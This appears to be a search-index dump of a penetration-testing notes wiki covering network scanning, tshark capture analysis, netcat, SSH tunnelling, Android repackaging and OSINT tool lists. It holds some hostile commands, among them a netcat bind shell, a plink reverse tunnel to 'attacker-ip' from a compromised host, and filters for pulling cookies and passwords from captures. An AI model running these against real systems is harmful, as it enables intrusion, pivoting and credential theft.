wlan . ssid | sort | uniq Unique list of SSID and BSSIDs side by side for all AP networks: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 - T fields - e wlan . ssid - e wlan . bssid | sort | uniq VoIP Show VoIP traffic: tshark - r VoIP_traffic . pcap - Y sip or rtp Print all REGISTER packets: tshark - r VoIP_traffic . pcap - Y sip.Method==REGISTER Only print the source IP, sender extension and authorization digest response for REGISTER packets: tshark - r VoIP_traffic . pcap - Y sip.Method==REGISTER - Tfields - e ip . src - e sip . from . user - e sip . auth . digest . response Print all codecs being used by RTP protocol: tshark - r VoIP_traffic . pcap - Y sdp - Tfields - e sdp . media User who is using the Zoiper VoIP client: tshark - r VoIP_traffic . pcap - Y sip contains Zoiper - Tfields - e ip . src IP address of the SIP server used to place calls: tshark - r VoIP_traffic . pcap - Y sip.Method==REGISTER - Tfields - e ip . dst Content of the text message sent to +918108591527?: tshark - r VoIP_traffic . pcap - Y sip.Method == MESSAGE - V ( Read the content ) Extensions completed a call successfully: tshark - r VoIP_traffic . pcap - Y sip.Method==BYE - Tfields - e sip . from . user - e sip . to . user Defense Phishing Blacklist: https://www.phishing.army/ References Beginner's Guide to Impacket Tool kit (Part 1) Let's code a TCP/IP stack, 1: Ethernet ARP: http://www.saminiir.com/lets-code-tcp-ip-stack-1-ethernet-arp/ Let's code a TCP/IP stack, 2: IPv4 ICMPv4: http://www.saminiir.com/lets-code-tcp-ip-stack-2-ipv4-icmpv4/ Let's code a TCP/IP stack, 3: TCP Basics Handshake: http://www.saminiir.com/lets-code-tcp-ip-stack-3-tcp-handshake/ Practical man-in-the-middle attacks in computer networks - Mat\u02c7ej Plch: https://is.muni.cz/th/s8uf2/thesis.pdf","title":"Network"},{"location":"network/#quick-reference","text":"Cheat Sheets Nmap: https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf Wireshark: https://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf TcpDump: https://packetlife.net/media/library/12/tcpdump.pdf Netcat: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf Ncat: https://medium.com/@pentest_it/ncat-cheatsheet-ddc5f07d8533 Scapy: https://blogs.sans.org/pen-testing/files/2016/04/ScapyCheatSheet_v0.2.pdf Quick Reference How to Find Your Public IP Address on Linux Command Line : curl https : // ipaddr . pub MAC to IPv6: https://ben.akrin.com/?p=1347 take the mac address: for example 52 : 74 : f2 : b1 : a8 : 7 f throw ff : fe in the middle: 52:74:f2: ff : fe :b1:a8:7f reformat to IPv6 notation 5274 : f2ff : feb1 : a87f convert the first octet from hexadecimal to binary: 52 - 01010010 invert the bit at index 6 (counting from 0): 01010010 - 01010000 convert octet back to hexadecimal: 01010000 - 50 replace first octet with newly calculated one: 5074 : f2ff : feb1 : a87f prepend the link-local prefix: fe80 :: 5074 : f2ff : feb1 : a87f https://stackoverflow.com/questions/27693120/convert-from-mac-to-ipv6 format_eui_64 () { local macaddr = $1 printf %02x%s $ (( 16 #$ { macaddr : 0 : 2 } ^ 2 # 00000010 )) ${macaddr:2} \\ | sed - E - e s / ([ 0 - 9 a - zA - Z ]{ 2 }) */ 0 x \\ 0 |/ g \\ | tr - d : \\ n \\ | xargs - d | \\ printf %02x%02x:%02xff:fe%02x:%02x%02x } HTTP Request with / dev / tcp exec 3 /dev/tcp/ ( INTERNAL IP ADDRESS ) /80 echo -e GET / HTTP/1.1\\r\\nHost: (INTERNAL IP ADDRESS)\\r\\nConnection: close\\r\\nUser-Agent: Mozilla/5.0 (X11;Linux x86_64...) Gecko/20100101 Firefox/60.0\\r\\n\\r\\n 3 cat 3 TCP Flag Key: http://rapid.web.unc.edu/resources/tcp-flag-key/ Network Discovery nmap - sP 192 . 168 . 1 . 1 - 255 ettercap - T - i eth0 /// netdiscover - i ens33 IPv6 ping ( TARGET IP ADDRESS ) arp - a","title":"Quick Reference"},{"location":"network/#port-scanning","text":"FPing: for ip in $ ( seq 1 254 ) ;do fping 10.11.1.$ip fping.txt;done;grep alive ./fping.txt Nc: for ip in $ ( seq 1 5 ) ; do nc -nvv -z 192.168.1.$ip 80 /tmp/ncscan.txt done nc - z - v ( TARGET IP ADDRESS ) 1 - 1024 2 / dev / stdout | grep - v refused ARP ping: nmap - sP - PR 10 . 11 . 1 . 0 / 24 - oG nmap - arp . txt Ping: for ip in $ ( seq 1 254 ) ;do ping -c 1 192.168.1.$ip | grep bytes from | cut -d -f4 | cut -d : -f1 done /dev/tcp: for port in $ ( seq 1 65530 ) ; do (echo $port /dev/tcp/$target/$port printf [!] $port is open.\\n ) 2 /dev/null done Port monitor watch -n1 nc -w1 -nvz 192 .168.1.23 123 # -w1: timeout 1 sec, -n: no reverse lookup, -v: verbose, -z: no IO, act as a scanner Nmap: Evade Firewall - sA - TCP ACK Scan Because of the ACK packets the firewall cannot create the log Firewalls treat ACK packet as the response of the SYN packet - Open port (few ports in the case of the firewall) Closed port (most ports are closed because of the firewall) Filtered (Nmap is not sure whether the port is open or not) Unfiltered (Nmap can access the port but is still confused about the open status of the port) - sW - TCP Window Scan Designed to differentiate between open and closed ports instead of showing unfiltered Does not open any active session with the target computer Send ACK packets and receive a single RST packet in response - f , - ff - Fragment Packets - spoof - mac Cisco - Spoof MAC - scan_delay - control the delay between each and every request - host - timeout Types of port scans TCP Connect Scan: nc - nvv - w 1 - z ip port - range Full 3 way handshake SYN / Stealth Scan Send SYN SYN-ACK means open RST means closed UDP Scanning: nc - nv - u - z - w 1 ip port - range ICMP port unreachable means closed No response means open Port Knocking: for x in 1111 , 2222 , 3333 ; do nmap -Pn --host_timeout 201 --scan-delay 0.2 --max-retries 0 -p $x IP ; done Look for: knockd Configured at: \u200b / etc / knockd . conf \u200b Scanning Methods All TCP and UDP fast scan: masscan -p1-65535,U:1-65535 IP --rate = 1000 -e tun0 -p1-65535,U:1-65535 ports ports = $( cat ports | awk -F {print $4} | awk -F / {print $1} | sort -n | tr \\n , | sed s/,$// ) nmap -Pn -sV -sC -sU -sT -p $ports IP Quick all TCP scan using Nmap only: ports =( nmap -p- --min-rate = 1000 -T4 IP | grep ^ [ 0 -9 ] | cut -d / -f 1 | tr \\n , | sed s/,$// ) nmap -Pn -sV -sC -sU -sT -p $ports IP Quick all TCP and UDP scan using Nmap only: ports =( nmap -p- --min-rate = 1000 -T4 IP | grep ^ [ 0 -9 ] | cut -d / -f 1 | tr \\n , | sed s/,$// ) nmap -Pn -sV -sC -sU -sT -p $ports IP nmap -sS -T5 -A -f -v IP nmap -n -Pn -sV --version-all --open -sC -oA [ target ] --stats-every 120 nmap -T4 -sV -sC -Pn [ box ip ] -oA [ box_name ] _initial_scan Vulnerability Scanning Nmap nmap -v -p 80 --script http-vuln-cve2010-2861 ip nmap -v -p 80 --script all ip nmap -v -p 80 -sC ip nmap -v -p 80 --script default,safe ip OpenVAS openvas - setup https : // ip : 9392","title":"Port Scanning"},{"location":"network/#port-forwarding-tunneling","text":"Local: ssh gateway -L local port to listen : remote host : remote port Remote: ssh gateway -R remote port to bind : local host : local port Dynamic: ssh gateway -D port to bind Local: plink.exe gateway -L local port to listen : remote host : remote port Remote: plink.exe gateway -R remote port to bind : local host : local port Dynamic: plink.exe gateway -D port to bind","title":"Port Forwarding / Tunneling"},{"location":"network/#local-port-forwarding","text":"https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot ssh -L local-port-to-listen : remote-host : remote-port gateway Allow connections to a specific blocked server. From work login to home and use it as a gateway to access banned - site . com : 80 : ssh -L 9001 :banned-site.com:80 user@home #work curl http://localhost:9001 #home ssh -L 9001 :banned:22 user@home ssh -p 9001 localhost Allow remote connections to local port forwards (listening on all interfaces) ssh -L 9001 :banned:22 user@home -g ssh -p 9001 work_machine #remotely Access a port on your server which can only be accessed from localhost and not remotely. Server acts as the gateway and binds server's port 5432 to local port 9000. ssh -L 9000 :localhost:5432 user@server psql -h localhost -p 9000","title":"Local Port Forwarding"},{"location":"network/#remote-port-forwarding","text":"https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot Allow remote access to restricted network. Server will bind port 9001 on home machine to listen for incoming requests which would subsequently be routed through the created SSH channel. Connecting to localhost : 9001 in home will forward user to intra:22 ssh -R 9001 :intra-ssh-server:22 user@home #work ssh -p 9001 localhost #home Add GatewayPorts yes to sshd_config to listening on all interfaces. Allow public access to a local resource through a public server. ssh -R 9000 :localhost:3000 user@public_sever sudo vim /etc/ssh/sshd_config GatewayPorts yes sudo service ssh restart","title":"Remote Port Forwarding"},{"location":"network/#dynamic-port-forwarding","text":"One local port for tunneling data to all remote destinations (SOCKS protocol) ssh -D 9001 home","title":"Dynamic port forwarding"},{"location":"network/#quick-reference_1","text":"Monitoring Tunnels: netstat - tunelp Avoid TTL: - nNT Creating reverse SSH client to tunnel-out remote desktop port FROM remote non-routable machine pling -l root -pw password attacker-ip -R 3390 :127.0.0.1:3389 # localhost 3389 to attacker ip 3389 FROM attacker's machine rdesktop localhost:3390 SSH Dynamic Port Forwarding (compromised DMZ used to scan internal IPs) Create local SOCS4 proxy: From attacker's machine (compromised DMZ) ssh -D 8080 root@DMZ-IP netstat -antp | grep 8080 /etc/proxychains.conf socks4 127 .0.0.1 8080 proxychains nmap -p 3389 -ST -Pn non-routable-remote-ip-range --oepn proxychains rdesktop rdp-ip-in-non-routable-range Tools rinetd When outbound only 80 / 443 use port forwarding (ip1:80 will proxy for ip2:3389) nano / etc / rinetd . conf ip1 80 ip2 3389 bindaddress bindport connectaddress connectport XFLTReaT tunnelling framework: https://github.com/earthquake/XFLTReaT TCP UDP ICMP SOCKS v4 , 4 a , 5 HTTP CONNECT SCTP ( by Darren Martyn @ info_dox ) WebSocket DNS ( A / CNAME , PRIVATE , NULL ) - Proof of Concept RDP ( Windows only ) https://github.com/sshuttle/sshuttle https://github.com/klsecservices/rpivot https://github.com/wolfSSL/wolfssh https://github.com/jpillora/chisel References https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/ http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html https://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html New References https://vimeo.com/54505525","title":"Quick Reference"},{"location":"network/#tools","text":"Inject code and spy on wifi users: https://github.com/DanMcInerney/LANs.py Collection of PowerShell network security scripts for system administrators: https://github.com/thom-s/netsec-ps-scripts CyberScan: Network's Forensics ToolKit Sparta: https://github.com/SECFORCE/sparta BetterCap - Swiss army knife for network attacks and monitoring: https://www.bettercap.org/ Pwning WPA/WPA2 Networks With Bettercap and the PMKID Client-Less Attack: https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/#.XGRV3mo06jA.twitter Nmap Port Related Information: / usr / share / nmap / nmap - servies ICMP (Ping) Sweep: nmap - sn pi - rage nmap - sn ip - range - oG filename ( grepable format ) Sweep TCP/UDP ports: nmap - p 80 ip - range - oG filename Sweep full network for top ports: nmap - sT - A --top-ports=20 ip-range -G filename Script engine: ls - l / usr / share / nmap / scripts | grep smb Important flags - O for OS Fingerprinting - sV for banner grabbing Netstat Kernel IP routing table: netstat - nr Listening ports: netstat - lp netstat - lvnp Netcat Cheat sheet: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf General Commands Listen on port 567/TCP: nc - l - p 567 Connecting to 567 of 1.2.3.4: nc 1 . 2 . 3 . 4 5676 Pipe a text file to the listener: cat infile | nc 1 . 2 . 3 . 4 567 - q 10 Have the listener save a received text file: nc - l - p 567 textfile Transfer a directory: Reciever: nc - l - p 678 | tar xvfpz Sender: tar zcfp - / path / to / directory | nc - w 3 1 . 2 . 3 . 4 678 Send a message to your syslog server (the 0 means emerg): echo 0 message | nc - w 1 - u syslogger 514 Setup a remote shell listener: nc - v - e /bin/bash - l - p 1234 - t nc l p 1234 e c:\\windows\\system32\\cmd.exe Make an HTTP request: echo - e GET http://www.google.com HTTP/1.0nn | nc - w 5 www . google . com 80 One-page webserver: cat homepage . txt | nc - v - l - p 80 General Options Use IPv4 addressing only: nc - 4 [ options ] [ host ] [ port ] Use IPv6 addressing only: nc - 6 [ options ] [ host ] [ port ] UDP instead of TCP: nc - u [ options ] [ host ] [ port ] Listen for an incoming connection: nc - l [ host ] [ port ] Continue listening after client has disconnected: nc - k - l [ host ] [ port ] No DNS lookups: nc - n [ host ] [ port ] Use specific source port: nc - p [ source port ] [ host ] [ port ] Use source IP: nc - s [ source ip ] [ host ] [ port ] Apply 'n' second timeout: nc - w [ timeout ] [ host ] [ port ] Verbose output: nc - v [ host ] [ port ] Port Scanning Scan a single TCP port: nc - zv hostname . com 80 Scan a range of ports: nc - zv hostname . com 80 - 84 Scan multiple ports: nc - zv hostname . com 80 84 Other One page web server: while : ; do ( echo -ne HTTP/1.1 200 OK\\r\\nContent-Length: $(wc -c index.html)\\r\\n\\r\\n ; cat index.html; ) | nc -l -p 8080 ; done Proxy: mknod backpipe p ; nc - l [ proxy port ] backpipe | nc [ destination host ] [ destination port ] pipe Wrap readline history library (support up arrow, etc): rlwrap nc - t remotehost 23 References: https://kapeli.com/cheat_sheets/Netcat.docset/Contents/Resources/Documents/index http://workrobot.com/sysadmin/security/netcat_cheatsheet.html","title":"Tools"},{"location":"network/#techniques","text":"","title":"Techniques"},{"location":"network/#domain-fronting","text":"Tools Psiphon: https://www.psiphon3.com/en/index.html Meek: https://trac.torproject.org/projects/tor/wiki/doc/AChildsGardenOfPluggableTransports#meek References Introduction: https://www.andreafortuna.org/cybersecurity/privacy/domain-fronting-in-a-nutshell/ Usage in APT29: https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html Azure (Hardening Your Azure Domain Front): https://medium.com/@rvrsh3ll/hardening-your-azure-domain-front-7423b5ab4f64 A 101 on Domain Fronting: https://digi.ninja/blog/domain_fronting.php Domain Fronting with CloudFront: https://digi.ninja/blog/cloudfront_example.php","title":"Domain Fronting"},{"location":"network/#traffic-analysis","text":"Accounting Traffic #!/bin/bash # Reset counters and iptables rules iptables -Z iptables -F # Measure incoming traffic from lab machine iptables -I INPUT 1 -s 192 .168.1.23 -j ACCEPT # Measure outgoing traffic to lab machine iptables -I OUTPUT 1 -d 192 .168.1.23 -j ACCEPT watch - n 1 iptables - nvL Using a Capture: aircrack - ng captured . cap \u200b Netcap - A framework for secure and scalable network traffic analysis: https://github.com/dreadl0ck/netcap PCAP Samples: Netresec: https://www.netresec.com/?page=pcapfiles Malware Traffic Analysis: https://www.malware-traffic-analysis.net/ Packettotal (Just like virustotal but for PCAP Analysis): https://packettotal.com/ https://wiki.wireshark.org/SampleCaptures PA Toolkit (Pentester Academy Wireshark Toolkit) - PA Toolkit is a collection of traffic analysis plugins to extend the functionality of Wireshark from a micro-analysis tool and protocol dissector to the macro analyzer and threat hunter: https://github.com/pentesteracademy/patoolkit CapAnalysis: https://drive.google.com/uc?authuser=0 id=1Lf8yU7alFZdRlT6WstKjngN2RAp-1jG8 export=download Netsh (Windows) netsh trace show capturefilterhelp netsh trace show scenarios netsh trace show globalkeywordsandlevel netsh trace start capture = yes IPv4 . Address = 192 . 168 . 122 . 2 netsh trace start scenario = InternetClient , InternetServer , NetConnection globalLevel = win : Verbose capture = yes report = yes traceFile = C : \\ temp \\ trace \\ trace001 . etl netsh trace stop Use Microsoft Network Monitor 3.4 to view: https://www.microsoft.com/en-us/download/details.aspx?id=4865 Convert to PAC from: https://github.com/microsoft/etl2pcapng Use powershell to convert: $s = New-PefTraceSession -Path \u201c C : \\ output \\ path \\ spec \\ OutFile . Cap \u201d -SaveOnStop $s | Add-PefMessageProvider -Provider \u201c C : \\ input \\ path \\ spec \\ Input . etl \u201d $s | Start-PefTraceSession tcpdump to show HTTP request/response headers https://serverfault.com/questions/504431/human-readable-format-for-http-headers-with-tcpdump sudo tcpdump -A -s 10240 tcp port 4080 and (((ip[2:2] - ((ip[0] 0xf) 2)) - ((tcp[12] 0xf0) 2)) != 0) | egrep --line-buffered ^........(GET |HTTP\\/|POST |HEAD )|^[A-Za-z0-9-]+: | sed -r s/^........(GET |HTTP\\/|POST |HEAD )/\\n\\1/g sudo stdbuf -oL -eL /usr/sbin/tcpdump -A -s 10240 tcp port 4080 and (((ip[2:2] - ((ip[0] 0xf) 2)) - ((tcp[12] 0xf0) 2)) != 0) | egrep -a --line-buffered .+(GET |HTTP\\/|POST )|^[A-Za-z0-9-]+: | perl -nle BEGIN{$|=1} { s/.*?(GET |HTTP\\/[0-9.]* |POST )/\\n$1/g; print } tcpdump tcpdump - i eth1 - s 0 port not 22 tcpdump - i eth1 - s 0 port not 22 and port not 53 tcpdump - i eth1 port not 22 and host 1 . 2 . 3 . 4","title":"Traffic Analysis"},{"location":"network/#tshark","text":"General Supported network interfaces: tshark - D Sniff on eth0: tshark - i eth0 Open pcap : tshark - r HTTP_traffic . pcap Read 100 packets from pcap : tshark - r HTTP_traffic . pcap - c 100 Print full details for first 10 Packets: tshark - r HTTP_traffic . pcap - c 10 - V List of protocols in pcap : tshark - r HTTP_traffic . pcap - z io , phs - q Export into PDML: tshark - r HTTP_traffic . pcap - T pdml http . xml PDML to HTML: xsltproc / usr / share / wireshark / pdml2html . xsl http . xml http . html HTTP Only the HTTP traffic: tshark - Y http - r HTTP_traffic . pcap IP packets sent from IP address 192.168.252.128 to 52.32.74.91?: tshark - r HTTP_traffic . pcap - Y ip.src==192.168.252.128 ip.dst==52.32.74.91 Packets containing GET requests: tshark - r HTTP_traffic . pcap - Y http.request.method==GET Print only source IP and URL for all GET request packets: tshark - r HTTP_traffic . pcap - Y http.request.method==GET - Tfields - e frame . time - e ip . src - e http . request . full_uri Packets contain the \"password\" string: tshark - r HTTP_traffic . pcap - Y http contains password \u201d Destination IP for GET requests sent to New York Times ( www.nytimes.com ): tshark - r HTTP_traffic . pcap - Y http.request.method==GET http.host==www.nytimes.com - Tfields - e ip . dst Session ID being used by 192.168.252.128 for Amazon India store (amazon.in)?: tshark - r HTTP_traffic . pcap - Y ip contains amazon.in ip.src==192.168.252.128 - Tfields - e ip . src - e http . cookie Type of OS 192.168.252.128 is using: tshark - r HTTP_traffic . pcap - Y ip.src==192.168.252.128 http - Tfields - e http . user_agent HTTPS Only show SSL traffic?: tshark - r HTTPS_traffic . pcap - Y ssl Only print the source IP and destination IP for all SSL handshake packets: tshark - r HTTPS_traffic . pcap - Y ssl.handshake - Tfields - e ip . src - e ip . dst List issuer name for all SSL certificates exchanged: tshark - r HTTPS_traffic . pcap - Y ssl.handshake.certificate - Tfields - e x509sat . printableString Print the IP addresses of all servers accessed over SSL: tshark - r HTTPS_traffic . pcap - Y ssl ssl.handshake.type==1 - Tfields - e ip . dst IP addresses associated with Ask Ubuntu servers (askubuntu.com): tshark - r HTTPS_traffic . pcap - Y ip contains askubuntu The IP address of the user who interacted with with Ask Ubuntu servers (askubuntu.com) tshark - r HTTPS_traffic . pcap - Y ip.dst==151.101.1.69 || ip.dst==151.101.193.69 || ip.dst==151.101.129.69 || ip.dst==151.101.65.69 - Tfields - e ip . src What DNS servers were used: tshark - r HTTPS_traffic . pcap - Y dns dns.flags.response==0 - Tfields - e ip . dst Name of the antivirus solution: tshark - r HTTPS_traffic . pcap - Y ip contains avast - Tfields - e ip . src WiFi Show only WiFi traffic: tshark - r WiFi_traffic . pcap - Y wlan View the deauthentication packets: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype==0x000c Display WPA handshake packets: tshark - r WiFi_traffic . pcap - Y eapol Print the SSID and BSSID values for all beacon frames: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype==8 - Tfields - e wlan . ssid - e wlan . bssid What is BSSID of SSID \"LazyArtists\": tshark - r WiFi_traffic . pcap - Y wlan.ssid==LazyArtists - Tfields - e wlan . bssid Channel of SSID \"Home_Network\": tshark - r WiFi_traffic . pcap - Y wlan.ssid==Home_Network - Tfields - e wlan_radio . channel Devices that received deauth messages: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype==0x000c - Tfields - e wlan . ra Which device does MAC 5c:51:88:31:a0:3b belongs to: tshark - r WiFi_traffic . pcap - Y wlan.ta==5c:51:88:31:a0:3b http - Tfields - e http . user_agent Beacon frames present: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 Unique list of all AP BSSIDs: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 - T fields - e wlan . bssid | sort | uniq Unique list of all AP SSIDs: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 - T fields - e wlan . ssid | sort | uniq Only non-null SSIDs: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 !(wlan.tag.length ==0) - T fields - e wlan . ssid | sort | uniq Unique list of SSID and BSSIDs side by side for all AP networks: tshark - r WiFi_traffic . pcap - Y wlan.fc.type_subtype == 0x0008 - T fields - e wlan . ssid - e wlan . bssid | sort | uniq VoIP Show VoIP traffic: tshark - r VoIP_traffic . pcap - Y sip or rtp Print all REGISTER packets: tshark - r VoIP_traffic . pcap - Y sip.Method==REGISTER Only print the source IP, sender extension and authorization digest response for REGISTER packets: tshark - r VoIP_traffic . pcap - Y sip.Method==REGISTER - Tfields - e ip . src - e sip . from . user - e sip . auth . digest . response Print all codecs being used by RTP protocol: tshark - r VoIP_traffic . pcap - Y sdp - Tfields - e sdp . media User who is using the Zoiper VoIP client: tshark - r VoIP_traffic . pcap - Y sip contains Zoiper - Tfields - e ip . src IP address of the SIP server used to place calls: tshark - r VoIP_traffic . pcap - Y sip.Method==REGISTER - Tfields - e ip . dst Content of the text message sent to +918108591527?: tshark - r VoIP_traffic . pcap - Y sip.Method == MESSAGE - V ( Read the content ) Extensions completed a call successfully: tshark - r VoIP_traffic . pcap - Y sip.Method==BYE - Tfields - e sip . from . user - e sip . to . user","title":"TSHark"},{"location":"network/#defense","text":"Phishing Blacklist: https://www.phishing.army/","title":"Defense"},{"location":"network/#references","text":"Beginner's Guide to Impacket Tool kit (Part 1) Let's code a TCP/IP stack, 1: Ethernet ARP: http://www.saminiir.com/lets-code-tcp-ip-stack-1-ethernet-arp/ Let's code a TCP/IP stack, 2: IPv4 ICMPv4: http://www.saminiir.com/lets-code-tcp-ip-stack-2-ipv4-icmpv4/ Let's code a TCP/IP stack, 3: TCP Basics Handshake: http://www.saminiir.com/lets-code-tcp-ip-stack-3-tcp-handshake/ Practical man-in-the-middle attacks in computer networks - Mat\u02c7ej Plch: https://is.muni.cz/th/s8uf2/thesis.pdf","title":"References"},{"location":"operating-systems/","text":"Linux Windows Android Quick Reference Take screenshots from ADB: adb shell screencap - p | perl - pe s/\\x0D\\x0A/\\x0A/g screen . png Tools A framework for automated extraction of static and dynamic features from Android applications: https://github.com/alexMyG/AndroPyTool Issues seccomp ptrace Issue 1718: Android: ptrace hole makes seccomp filter useless on devices with kernel 4.8: https://bugs.chromium.org/p/project-zero/issues/detail?id=1718 Chainspotting: Building Exploit Chains with Logic Bugs: https://labs.mwrinfosecurity.com/publications/chainspotting-building-exploit-chains-with-logic-bugs/ Techniques Dynamic Analysis # unpack and decompile whole APK to be patched later apktool d application.apk -o re_project0/ # create folder for all decompiled smali sources mkdir -p re_project0/src # copy all the smali code to sources folder cp -R re_project0/smali*/* re_project0/src application android:debuggable= true android:allowBackup= true android:icon= @mipmap/ic_launcher android:label= @string/app_name android:largeHeap= true android:name= org.horaapps.leafpic.App android:theme= @style/Theme.AppCompat apktool b re_project0/ keytool -genkey -v -keystore key.keystore -alias sign -keyalg RSA -keysize 2048 -validity 10000 References https://malacupa.com/2018/11/11/debug-decompiled-smali-code-in-android-studio-3.2.html iOS Codes * 5005 * 78283 # Dial to dump baseband to /Library/Logs/Baseband Use idevicecrashreport to copy to pc https://twitter.com/userlandkernel/status/1081627817975128069 *# 5005 * 5667 # Crash commcenter / baseband https://twitter.com/userlandkernel/status/1081630998431977473 References iOS Pentesting Tools Part 3: Frida and Objection: https://www.allysonomalley.com/2018/12/20/ios-pentesting-tools-part-3-frida-and-objection/ MacOS Important files / etc / fstab / etc / master . passwd / etc / resolv . conf / etc / sudoers / etc / sysctl . conf Defense Tools xnumon - monitor macOS for malicious activity: https://github.com/droe/xnumon Solaris https://blogs.oracle.com/solaris/understading-rbac-v2","title":"Operating systems"},{"location":"operating-systems/#linux","text":"","title":"Linux"},{"location":"operating-systems/#windows","text":"","title":"Windows"},{"location":"operating-systems/#android","text":"","title":"Android"},{"location":"operating-systems/#quick-reference","text":"Take screenshots from ADB: adb shell screencap - p | perl - pe s/\\x0D\\x0A/\\x0A/g screen . png","title":"Quick Reference"},{"location":"operating-systems/#tools","text":"A framework for automated extraction of static and dynamic features from Android applications: https://github.com/alexMyG/AndroPyTool","title":"Tools"},{"location":"operating-systems/#issues","text":"seccomp ptrace Issue 1718: Android: ptrace hole makes seccomp filter useless on devices with kernel 4.8: https://bugs.chromium.org/p/project-zero/issues/detail?id=1718 Chainspotting: Building Exploit Chains with Logic Bugs: https://labs.mwrinfosecurity.com/publications/chainspotting-building-exploit-chains-with-logic-bugs/","title":"Issues"},{"location":"operating-systems/#techniques","text":"Dynamic Analysis # unpack and decompile whole APK to be patched later apktool d application.apk -o re_project0/ # create folder for all decompiled smali sources mkdir -p re_project0/src # copy all the smali code to sources folder cp -R re_project0/smali*/* re_project0/src application android:debuggable= true android:allowBackup= true android:icon= @mipmap/ic_launcher android:label= @string/app_name android:largeHeap= true android:name= org.horaapps.leafpic.App android:theme= @style/Theme.AppCompat apktool b re_project0/ keytool -genkey -v -keystore key.keystore -alias sign -keyalg RSA -keysize 2048 -validity 10000","title":"Techniques"},{"location":"operating-systems/#references","text":"https://malacupa.com/2018/11/11/debug-decompiled-smali-code-in-android-studio-3.2.html","title":"References"},{"location":"operating-systems/#ios","text":"","title":"iOS"},{"location":"operating-systems/#codes","text":"* 5005 * 78283 # Dial to dump baseband to /Library/Logs/Baseband Use idevicecrashreport to copy to pc https://twitter.com/userlandkernel/status/1081627817975128069 *# 5005 * 5667 # Crash commcenter / baseband https://twitter.com/userlandkernel/status/1081630998431977473","title":"Codes"},{"location":"operating-systems/#references_1","text":"iOS Pentesting Tools Part 3: Frida and Objection: https://www.allysonomalley.com/2018/12/20/ios-pentesting-tools-part-3-frida-and-objection/","title":"References"},{"location":"operating-systems/#macos","text":"","title":"MacOS"},{"location":"operating-systems/#important-files","text":"/ etc / fstab / etc / master . passwd / etc / resolv . conf / etc / sudoers / etc / sysctl . conf","title":"Important files"},{"location":"operating-systems/#defense","text":"Tools xnumon - monitor macOS for malicious activity: https://github.com/droe/xnumon","title":"Defense"},{"location":"operating-systems/#solaris","text":"https://blogs.oracle.com/solaris/understading-rbac-v2","title":"Solaris"},{"location":"osint/","text":"OSINT Tools Craal (GitHub, Pastebin, S3 Buckets, Protoxin, CertStream): https://github.com/jaylagorio/craal Semi-automatic OSINT framework and package manager: https://github.com/kpcyrd/sn0int Discover and extract hostnames providing a large set of target IP addresses: - https://github.com/SpiderLabs/HostHunter sslyze - Fast and powerful SSL/TLS server scanning library. https://github.com/nabla-c0d3/sslyze OSINT-SPY - Performs OSINT scan on email/domain/ip_address/organization - https://github.com/SharadKumar97/OSINT-SPY Vanquish is Kali Linux based Enumeration Orchestrator - https://github.com/frizb/Vanquish | NMap | Hydra | Nikto | Metasploit | | Gobuster | Dirb | Exploitdb | Nbtscan | | Ntpq | Enum4linux | Smbclient | Rpcclient | | Onesixtyone | Sslscan | Sslyze | Snmpwalk | | Ident - user - enum | Smtp - user - enum | Snmp - check | Cisco - torch | | Dnsrecon | Dig | Whatweb | Wafw00f | | Wpscan | Cewl | Curl | Mysql | Nmblookup | Searchsploit | | Nbtscan - unixwiz | Xprobe2 | Blindelephant | Showmount | LazyRecon - An automated approach to performing recon for bug bounty hunting and penetration testing - https://github.com/capt-meelo/LazyRecon/ - Subdomain Enumeration : - [ Amass ] ( https : // github . com / OWASP / Amass ) - [ Subfinder ] ( https : // github . com / subfinder / subfinder ) - Subdomain Takeover : - [ subjack ] ( https : // github . com / haccer / subjack ) - CORS Configuration : - [ CORScanner ] ( https : // github . com / chenjj / CORScanner ) - IP Discovery : - [ Massdns ] ( https : // github . com / blechschmidt / massdns ) - Port Scanning : - [ Masscan ] ( https : // github . com / robertdavidgraham / masscan ) - [ Nmap ] ( https : // nmap . org / ) - [ Nmap Bootstrap Stylesheet ] ( https : // github . com / honze - net / nmap - bootstrap - xsl / ) - Visual Recon : - [ Aquatone ] ( https : // github . com / michenriksen / aquatone ) - Content Discovery : - [ Dirsearch ] ( https : // github . com / maurosoria / dirsearch ) - Wordlists : - [ JHaddix s all.txt ] ( https : // gist . github . com / jhaddix / f64c97d0863a78454e44c2f7119c2a6a ) - [ SecLists raft-large-words.txt ] ( https : // github . com / danielmiessler / SecLists / blob / master / Discovery / Web - Content / raft - large - words . txt ) pown-recon - A powerful target reconnaissance framework powered by graph theory. - https://github.com/pownjs/pown-recon Streamline the bug bounty/penetration test reconnaissance phase - https://github.com/SolomonSklash/chomp-scan - Subdomain Discovery ( 3 different sized wordlists ) - dnscan - subfinder - sublist3r - massdns + altdns - subjack - Screenshots ( optional ) - aquatone - Port Scanning ( optional ) - masscan and / or nmap - Content Discovery ( optional ) ( 4 different sized wordlists ) - ffuf - bfac - nikto - whatweb - Wordlists - Subdomain Bruteforcing - subdomains - top1mil - 20000 . txt - 22 k words - From [ Seclists ] ( https : // github . com / danielmiessler / SecLists ) - sortedcombined - knock - dnsrecon - fierce - reconng . txt - 102 k words - From 